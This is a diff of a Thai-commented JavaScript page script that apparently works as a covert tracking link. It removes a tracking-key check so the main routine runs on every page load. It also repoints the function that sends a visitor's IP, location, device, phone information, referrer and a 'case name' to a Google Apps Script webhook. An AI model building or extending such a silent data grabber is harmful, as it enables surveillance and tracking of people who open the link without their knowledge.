@@ -1,38 +1,3 @@
-// เพิ่มฟังก์ชันนี้ที่ด้านบนของไฟล์ script.js
-async function checkTrackingKeyValidity(trackingKey) {
-  if (!trackingKey || trackingKey === "ไม่มีค่า") {
-    return false;
-  }
-  
-  try {
-    // ใช้เทคนิค JSONP หรือเรียกผ่านหน้าที่โฮสต์ใน domain เดียวกัน
-    // สร้าง iframe ที่ไม่แสดงเพื่อโหลด URL ตรวจสอบ
-    return new Promise((resolve) => {
-      const iframe = document.createElement('iframe');
-      iframe.style.display = 'none';
-      iframe.src = `https://script.google.com/macros/s/AKfycbxB4prWpouyldi-gZvmVW5c3uLr6w1YdWxlltZd4tjgSbKfo_OUh9WLqAamxnldMrsPwA/exec?action=verify&key=${encodeURIComponent(trackingKey)}&callback=handleVerifyResult`;
-      
-      // กำหนดเวลาหมดเวลา (timeout) เป็น 5 วินาที
-      const timeout = setTimeout(() => {
-        document.body.removeChild(iframe);
-        resolve(false); // ถ้าหมดเวลา ถือว่าไม่ผ่าน
-      }, 5000);
-      
-      // กำหนดฟังก์ชัน callback ให้ window object เพื่อรับผลลัพธ์
-      window.handleVerifyResult = function(result) {
-        clearTimeout(timeout);
-        document.body.removeChild(iframe);
-        resolve(result.valid);
-      };
-      
-      document.body.appendChild(iframe);
-    });
-  } catch (error) {
-    console.error("เกิดข้อผิดพลาดในการตรวจสอบ Tracking Key:", error);
-    return false;
-  }
-}
-
 // ฟังก์ชันดึง tracking key และ case name จาก URL parameters
 function getUrlParameters() {
   try {
@@ -58,24 +23,7 @@ function getUrlParameters() {
 }
 
 // ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
-(async function() {
-  // ดึง tracking key และ case name จาก URL parameters
-  const { trackingKey, caseName } = getUrlParameters();
-  
-  // ตรวจสอบความถูกต้องของ trackingKey
-  const isValidKey = await checkTrackingKeyValidity(trackingKey);
-  
-  if (!isValidKey) {
-    // ถ้า tracking key ไม่ถูกต้อง ให้เปลี่ยนเส้นทางหรือแสดงข้อความแจ้งเตือน
-    document.body.innerHTML = `
-      <div style="display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; color: #333; text-align: center; padding: 20px;">
-        <h2 style="color: #e74c3c;">⚠️ ข้อผิดพลาด: ลิงก์ไม่ถูกต้องหรือหมดอายุ</h2>
-        <p>ลิงก์นี้ไม่สามารถใช้งานได้ กรุณาติดต่อผู้ส่งลิงก์เพื่อขอลิงก์ใหม่</p>
-        <button onclick="window.location.href='https://www.google.com'" style="margin-top: 20px; padding: 10px 20px; background-color: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer;">กลับสู่หน้าหลัก</button>
-      </div>
-    `;
-    return; // หยุดการทำงาน
-  }
+(function() {
   // เก็บข้อมูลทั่วไป
   const timestamp = new Date().toLocaleString('th-TH', {
     timeZone: 'Asia/Bangkok',
@@ -521,7 +469,7 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
 
 function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
   // ส่งเฉพาะข้อมูลดิบไปที่ webhook โดยไม่สร้างข้อความเอง
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxB4prWpouyldi-gZvmVW5c3uLr6w1YdWxlltZd4tjgSbKfo_OUh9WLqAamxnldMrsPwA/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbzM9uoeKK0D4wc1z_pLTUxfHeoiaXPNQblHJAqEOZ10KrMoaaXs0dLdrLhqZHWgW2JpcQ/exec';
 
   // ส่งข้อมูลพื้นฐานทั้งหมดโดยไม่สร้างข้อความ message เอง
   const dataToSend = {
